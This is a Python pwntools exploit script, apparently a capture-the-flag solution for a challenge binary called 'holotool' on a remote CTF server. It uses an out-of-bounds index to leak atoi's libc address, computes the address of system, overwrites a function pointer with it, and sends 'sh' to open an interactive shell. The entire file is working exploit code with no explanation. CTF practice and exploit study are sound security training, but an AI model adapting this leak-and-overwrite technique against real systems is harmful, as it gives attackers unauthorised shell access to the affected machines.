from pwn import *

# p = process('./distribute/share/holotool')
p = remote('ctf.adl.tw', 10005)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')


def show(idx):
    p.sendafter(b'> ', b'1')
    p.sendafter(b'idx> ', str(idx).encode())


def edit(idx, choice):
    p.sendafter(b'> ', b'2')
    p.sendafter(b'idx> ', str(idx).encode())
    p.sendafter(b'> ', str(choice).encode())


def bye():
    p.sendafter(b'> ', b'3')


show(-1)
p.recvuntil(b'name: ')
atoi = u64(p.recvline().strip().ljust(8, b'\x00'))
success('atoi 0x%x', atoi)
base = atoi - libc.sym['atoi']
success('libc base 0x%x', base)
system = base + libc.sym['system']

edit(-1, 1)
p.sendafter(b'Content: ', p64(system))

p.sendlineafter(b'> ', b'sh')

p.interactive()
